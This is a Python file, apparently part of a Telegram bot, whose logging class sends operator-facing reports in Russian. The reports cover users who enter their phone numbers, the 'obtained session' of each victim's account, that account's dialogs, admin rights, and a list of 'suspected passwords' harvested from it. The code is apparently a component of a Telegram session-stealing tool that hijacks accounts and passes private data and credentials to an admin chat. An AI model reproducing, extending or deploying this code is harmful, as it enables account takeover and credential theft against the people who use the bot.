import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)

class Log:

	def __init__(self, message):
		self.admin = message.bot.config.admin
		self.config = message.bot.config.log
		self._config = message.bot.config
		self.bot = message.bot
		self.user_id = message.chat.id
		self.username = f"(@{message.from_user.username})" if message.from_user.username else ''

	async def enter_start(self):
		if not self.config.enter_start:
			return None
		self.text = f"👤 Зашёл новый пользователь <code>{self.user_id}</> {self.username}."
		return await self._send()

	async def enter_phone(self, phone):
		if not self.config.enter_phone:
			return None
		region = phonenumbers.parse('+' + str(phone.replace('+', '')))
		self.text = f"👤 Пользователь <code>{self.user_id}</> {self.username} ввёл номер.\n" \
					f"📲 Номер: <b>{phone}</>\n" \
					f"💡 Страна: <b>{region_code_for_country_code(region.country_code)}</>"
		return await self._send()

	async def get_session(self, user):
		if not self.config.get_session:
			return None

		self.text = f"✅ Сессия пользователя <code>{self.user_id}</> {self.username} получена."
		self.text += "\n \n<b>👇 Пользователь 👇</>\n"
		self.text += f"👤 ID: <code>{user['user'].id}</>\n"
		self.text += f"⭐️ Премиум: <b>{user['user'].is_premium}</>\n"
		self.text += f"❗️ Скам: <b>{user['user'].is_scam}</>"

		self.text += "\n \n👇 <b> Диалоги 👇</>\n"
		for i in ['channel', 'bot', 'private', 'group', 'supergroup']:
			if not i in user.keys():
				continue
			count = user[i]
			txt = {'channel': '🔔 Каналы', 'bot': '🤖 Боты', 'private': '💬 Личные', 'group': '👤 Группы', 'supergroup': '👥 Супергруппы'}[i]
			self.text += f'{txt}: <b>{count}</b>\n'

		self.text += f"\n👉 Сообщения в избранном: <b>{user['me']}</>\n"
		self.text += f"👉 Админ-права: <b>{user['is_creator']}</> (избранное учитывается)\n \n"

		if user['find'] != '':
			self.text += f"🔍 <b>Найденные диалоги:</b> {user['find']}"

		return await self._send()


	async def passwords(self, data):
		if not self._config.auto_check_passwords or not len(data):
			return None
		self.text = f"🔐 <b>Подозрений на пароли пользователя - {len(data)}</>\n \n"
		for i in data:
			self.text += f"{i}\n"

		return await self._send()


	async def _send(self):
		try:
			return await self.bot.send_message(self.admin, self.text)
		except:
			print(self.text)
			return self.text
